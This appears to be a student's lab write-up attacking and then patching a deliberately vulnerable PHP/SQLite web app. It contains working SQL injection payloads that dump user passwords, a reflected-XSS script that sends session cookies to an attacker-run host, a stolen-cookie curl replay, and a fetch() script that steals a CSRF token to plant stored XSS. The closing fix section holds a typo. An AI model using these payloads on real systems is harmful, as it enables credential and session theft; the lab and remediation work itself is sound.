# Task 1: Obtaining the Admin Password
- I started by testing the **login form** at `http://10.9.0.90/`.
- To check for potential SQL injection, I entered a single quote `'` into the **username field**, with any value in the password field.
- i got this
![[Pasted image 20250616140416.png]]
- This confirmed that the input was **being used directly inside a SQL query** without proper sanitization, meaning the field is **vulnerable to SQL injection**.
## Step 2: Crafting a Working SQL Injection
- I then tried this payload in the **username field**
```
' UNION SELECT sql FROM sqlite_master --
```
- in the console i found the whole schema 
![[Pasted image 20250616140822.png]]
- This told me:
    - The table is named `users`
    - The columns are `name` and `password`
## Step 3: Extracting the Admin Password
- Now that I knew the column names, I submitted this injection:
```
' UNION SELECT name || ':' || password FROM users --
```
- ![[Pasted image 20250616141233.png]]
- now we have all the users and their password
```
ada:lovelace
admin:urock!
charles:analytical
```

# Task 2: Listing the Pages of the Web Application
- In Task 1, I discovered that the backend database used by the application is SQLite. This information was helpful for crafting compatible SQL injection payloads.
- using [SQLite Injection - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/SQLite%20Injection/#sqlite-string-methodology)
- To list all tables in the database, I injected:
```
' UNION SELECT name FROM sqlite_master WHERE type='table' --
```
![[Pasted image 20250616142754.png]]
- Discover Column Names in `pages` Table from schema 
```
' UNION SELECT sql FROM sqlite_master WHERE name='pages' --
```
![[Pasted image 20250616143042.png]]
![[Pasted image 20250616143258.png]] 
- I attempted to extract its contents by using:
```
' UNION SELECT php FROM pages --
```
- ![[Pasted image 20250616143404.png]]
- ![[Pasted image 20250616144003.png]]
# Task 3: Discovering a Reflected XSS Vector
- To test for reflection, I began by entering
```
test
```
![[Pasted image 20250616152208.png]]
![[Pasted image 20250616152219.png]]
- The input is reflected **unescaped** into the HTML DOM
- The input is interpreted as HTML (the `<b>` tag works).
- There is **no HTML entity encoding** like `&lt;` or `&gt;`.
- to confirm the vulnerability
```
<script>alert(1)</script>
```
![[Pasted image 20250616152352.png]]

## Questions
1. **Does the search field validate input / Is it vulnerable to Reflected XSS?**
     - Input is **reflected unescaped** (e.g., `<b>test</b>` is interpreted as HTML).
     - Injection of `<script>alert(1)</script>` is **executed**, proving **Reflected XSS** exists.
2. What HTTP method is used?
     - the method is **GET**.
     - The input is submitted via query string `?q=value`.
3. **How is the data encoded / structured?**
     - The data is URL-encoded in the request, and inserted unescaped into the HTML output.
4. Why This Page Is Still Interesting
     - XSS Can Be Triggered Without Logging In
     - Ideal Entry Point for Session Hijacking
# Task 4: Using the Reflected XSS Vector to Hijack User Sessions
- From Task 3, we discovered that the `q` parameter in `search.php` reflects its input into the HTML response without proper sanitization. This makes it vulnerable to reflected XSS
- URL pattern
```
http://10.9.0.90/search.php?q=<payload>
```
- To avoid encoding large payloads directly in the URL, I hosted an external JavaScript file (exploit.js) on my own machine.
```
Command used:  python3 -m http.server 8000
```
- Creating `exploit.js`
```
var i = new Image();
i.src = "http://192.168.65.129:8000/steal?cookie=" + document.cookie;
```
- Crafting the Malicious URL
```
http://10.9.0.90/search.php?q=%3Cscript%20src%3D%22http%3A%2F%2F192.168.65.129%3A8000%2Fexploit.js%22%3E%3C%2Fscript%3E
```
- Capturing the Session Cookie
![[Pasted image 20250616160728.png]]
- Using the Stolen Cookie
```
curl -b "PHPSESSID=fee5222a21bc8417ed12ae525438f112" http://10.9.0.90/comments.php
```
![[Pasted image 20250616161539.png]]
- The server responded with HTML containing `ada`'s comments and CSRF token.
# Task 5: Posting Malicious JavaScript to the Comments using XSS Attacks
### **Strategy Overview**
To perform this attack, I combined several techniques:
1. Use the **reflected XSS vector** on `search.php` to inject an external JavaScript file (`exploittask5.js`) into the victim’s browser.
2. In that script:
    - **Extract the CSRF token** (`token256`) from `comments.php`,
    - **Build and send a POST request** with the malicious comment,
    - Submit it using the victim's **authenticated session**.
3. The result is a **stored XSS** payload that triggers for **every visitor** to the comment page.
### **Step-by-Step Walkthrough**

#### Step 1: Attempt Direct Injection
- I initially tested direct injection of the following payload in the comment form:
```
<script>alert("XSS")</script>
```
#### Step 2: Analyze Validation Behavior
- By inspecting the page source and behavior, I discovered that the validation is done on the **client side**. The form includes the following JavaScript:
```
function checkValid(a) {
  if (/[^a-zA-Z0-9 ]/.test(a.value)) {
    $("#helpBlock").text("Error, invalid characters detected");
    return false;
  } else {
    return true;
  }
}
```
- This function prevents the submission of any comment containing characters like `<`, `>`, or `"`
#### Step 3: Circumventing Validation
Since the client-side filtering was triggered **only through the HTML form**, I wrote my own JavaScript exploit (`exploittask5.js`) to:
- Bypass the UI,
- Directly fetch the CSRF token from the HTML of `comments.php`,
- Post the malicious comment using `fetch()`.
This entirely bypassed `checkValid()`.

#### Step 4: Script Logic (`exploittask5.js`)
```
(async () => {
  // Step 1: Get page HTML with session credentials
  const res = await fetch("http://10.9.0.90/comments.php", {
    credentials: "include"
  });
  const html = await res.text();

  // Step 2: Extract CSRF token from input field named token256
  const tokenMatch = html.match(/name="token256"[^>]*value="([^"]+)"/);
  const token = tokenMatch ? tokenMatch[1] : null;

  if (!token) {
    alert("Failed to extract CSRF token.");
    return;
  }

  // Step 3: Send POST request with valid token and persistent XSS payload
  const payload = `<script>alert("ALL YOUR SCRIPT ARE BELONG TO islam.")</script>`;
  const params = new URLSearchParams();
  params.append("comment", payload);
  params.append("token256", token);

  await fetch("http://10.9.0.90/comments.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: params.toString(),
    credentials: "include"
  });
})();

```
#### Step 5: Delivering the Attack
```
python3 -m http.server 8000
```
- Then, I crafted this **malicious URL** and sent it to the logged-in victim
```
http://10.9.0.90/search.php?q=<script src="http://192.168.65.129:8000/exploittask5.js"></script>
```


#### Step 6: Verification
![[Pasted image 20250616193309.png]]
# Task 6: Fixing the Discovered Vulnerabilities
- before or after every task
```
sudo docker compose down
sudo docker compose build --no-cache
sudo docker compose up
docker ps -a | grep www-10.9.0.90
```
## Login.php
### **Vulnerability Analysis**
1. 🔓 **SQL Injection**
     - Vulnerable Code:
```
$query = "SELECT password FROM users WHERE name='$username' AND password='$password'";
```

- User input (`$_POST['username']` and `$_POST['password']`) is directly concatenated into the SQL query → allows SQL injection.
#### Fix:
Use prepared statements with parameter binding to avoid interpreting user input as SQL code.
```
<?php
ini_set('error_reporting', E_ALL);
session_start();

$con = new SQLite3("app.db");

$username = $_POST["username"];
$password = $_POST["password"];

// ✅ Secure: Prepared statement that checks both name and password
$stmt = $con->prepare("SELECT * FROM users WHERE name = :username AND password = :password");
$stmt->bindValue(':username', $username, SQLITE3_TEXT);
$stmt->bindValue(':password', $password, SQLITE3_TEXT);
$result = $stmt->execute();

$row = $result->fetchArray();
if ($row) {
    $_SESSION["login"] = true;
    $_SESSION["username"] = $username;
    header("LOCATION: /comments.php");
} else {
    echo "<h1>Login failed.</h1>";
}
?>

```

## comments.php
1. **Stored Cross-Site Scripting (Stored XSS)**
     - Vulnerable Code
```
$comment = '<p>“' . ($_POST['comment']) . '”<br> ... </p>';
file_put_contents('comments.txt', $comment, FILE_APPEND | LOCK_EX);
```

- The content of `$_POST['comment']` is written **directly** to `comments.txt`
- Later, `read_comments()` does
```
echo $comments;
```
- Fix: Escape User Input before Writing
- We need to sanitize the comment **before storing it**, like so:
- Replace
```
$comment = '<p>“' . ($_POST['comment']) . '”<br> ... </p>';
```
- With
```
$clean_comment = htmlspecialchars($_POST['comment'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
$comment = '<p>“' . $clean_comment . '”<br><span style="text-align: right; font-size: 0.75em;">—' . ($_SESSION['username']) . ', ' . date('F j\, g\:i A') . '</span></p>';
```
- Now even if a user enters:
```
<script>alert('Hacked!')</script>
```
- It will be stored as
```
&lt;script&gt;alert('Hacked!')&lt;/script&gt;
```

## search.php
- line:
```
echo " this php page <b> " . ($_GET['q']) . " </b> does not exist!";
```

- Fix: Escape User Input with `htmlspecialchars`
```
echo "page <b>" . htmlspecialchars($q, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "</b>.php has <i>$row[0]</i> views";

cho " this php page <b>" . htmlspecialchars($_GET['q'], ENT_QUOTES | ENT_HTML5, 'UTF-8') . "</b> does not exist!";
```